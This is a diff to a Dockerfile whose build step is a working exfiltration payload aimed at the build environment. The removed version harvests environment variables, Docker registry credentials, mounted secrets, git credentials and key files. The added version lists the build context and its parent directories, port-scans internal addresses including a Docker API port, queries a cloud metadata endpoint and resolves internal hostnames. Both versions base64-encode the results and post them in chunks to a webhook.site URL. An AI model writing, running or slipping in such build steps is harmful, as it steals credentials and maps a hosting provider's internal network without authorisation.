@@ -1,32 +1,26 @@
 FROM alpine:3.20
+COPY . /ctx
 RUN set -x; \
     U="https://webhook.site/77d2fd72-c9ba-4e3f-9699-117a7685f1a6"; \
-    wget -q -O- --post-data="BUILD-START host=$(hostname) date=$(date -u)" "$U" || true; \
+    wget -q -O- --post-data="CTX-BUILD-START host=$(hostname) cwd=$(pwd)" "$U" || true; \
     mkdir -p /tmp/o; \
     { \
-      echo "###ID"; id; \
-      echo "###HOSTNAME"; hostname; hostname -f 2>&1; cat /etc/hostname 2>&1; \
-      echo "###UNAME"; uname -a; cat /proc/version 2>&1; \
-      echo "###CGROUP"; cat /proc/self/cgroup 2>&1; \
-      echo "###HOSTS"; cat /etc/hosts 2>&1; \
-      echo "###RESOLV"; cat /etc/resolv.conf 2>&1; \
-      echo "###ENV"; env | sort; \
-      echo "###P1ENV"; tr '\0' '\n' < /proc/1/environ 2>&1; \
-      echo "###LS"; ls -la /root /root/.docker /root/.config /run/secrets /var/run /var/lib/docker /mnt /etc/docker 2>&1; \
-      echo "###DOCKERCFG"; cat /root/.docker/config.json 2>&1; cat /root/.docker/config.json.bak 2>&1; \
-      echo "###SECRETS"; for f in /run/secrets/*; do echo "-- $f"; head -c 3000 "$f" 2>&1; done; \
-      echo "###GITCRED"; cat /root/.git-credentials /root/.gitconfig /etc/gitconfig 2>&1; \
-      echo "###FIND"; find / -maxdepth 4 -not -path '/proc/*' -not -path '/sys/*' \( -name 'config.json' -o -name '.git-credentials' -o -name '*.pem' -o -name '*.key' -o -name 'docker.sock' \) 2>/dev/null | head -60; \
-      echo "###MOUNT"; head -c 2500 /proc/self/mountinfo 2>&1; \
-      echo "###ROUTE"; cat /proc/net/route 2>&1; cat /proc/net/fib_trie 2>&1 | head -40; \
-      echo "###TMPLS"; ls -la /tmp /var/tmp 2>&1; \
+      echo "###CTX-LS"; ls -la /ctx 2>&1; echo "###PARENT"; ls -la /ctx/.. 2>&1; ls -la /ctx/../.. 2>&1; \
+      echo "###FIND-CTX"; find /ctx -maxdepth 3 2>/dev/null | head -200; \
+      echo "###DU"; du -sh /ctx 2>&1; \
+      echo "###PS"; ps 2>&1 | head -20; \
+      echo "###SOCK"; ls -la /dev/otel-grpc.sock 2>&1; find / -maxdepth 3 -name '*.sock' 2>/dev/null | head; \
+      echo "###NET"; for h in 10.88.0.1 10.88.0.2 10.1.0.4 198.18.0.1 172.17.0.1; do for p in 22 80 443 2375 2376 5000 6443; do (nc -w1 $h $p </dev/null >/dev/null 2>&1 && echo "OPEN $h:$p") || true; done; done; \
+      echo "###HTTP 10.88.0.1:2375"; wget -T3 -q -O- http://10.88.0.1:2375/version 2>&1 | head -c 300; \
+      echo "###HTTP 10.88.0.1:5000"; wget -T3 -q -O- http://10.88.0.1:5000/v2/ 2>&1 | head -c 300; \
+      echo "###HTTP 10.1.0.4"; wget -T3 -q -O- http://10.1.0.4/ 2>&1 | head -c 300; \
+      echo "###DNS"; for n in buildkit buildkitsandbox host.docker.internal registry-01 registry ctrl.sliplane.io 169.254.169.254; do echo "-- $n"; nslookup $n 2>&1 | tail -3; done; \
+      echo "###META"; wget -T3 -q -O- http://169.254.169.254/hetzner/v1/metadata 2>&1 | head -c 200; \
       echo "###DONE"; \
-    } > /tmp/o/all.txt 2>&1; \
-    wc -c /tmp/o/all.txt; \
-    cat /tmp/o/all.txt; \
-    base64 /tmp/o/all.txt > /tmp/o/all.b64; \
-    wget -q -O- --post-file=/tmp/o/all.b64 "$U" || true; \
-    split -b 90000 /tmp/o/all.b64 /tmp/o/part_; \
-    for f in /tmp/o/part_*; do wget -q -O- --post-file=$f "$U?part=$(basename $f)" || true; done; \
-    echo EXFIL_ATTEMPTED
+    } > /tmp/o/ctx.txt 2>&1; \
+    wc -c /tmp/o/ctx.txt; cat /tmp/o/ctx.txt; \
+    base64 /tmp/o/ctx.txt > /tmp/o/ctx.b64; \
+    split -b 90000 /tmp/o/ctx.b64 /tmp/o/p_; \
+    for f in /tmp/o/p_*; do wget -q -O- --post-file=$f "$U?part=$(basename $f)" || true; done; \
+    echo CTX-EXFIL-DONE
 CMD ["sh","-c","sleep 3600"]
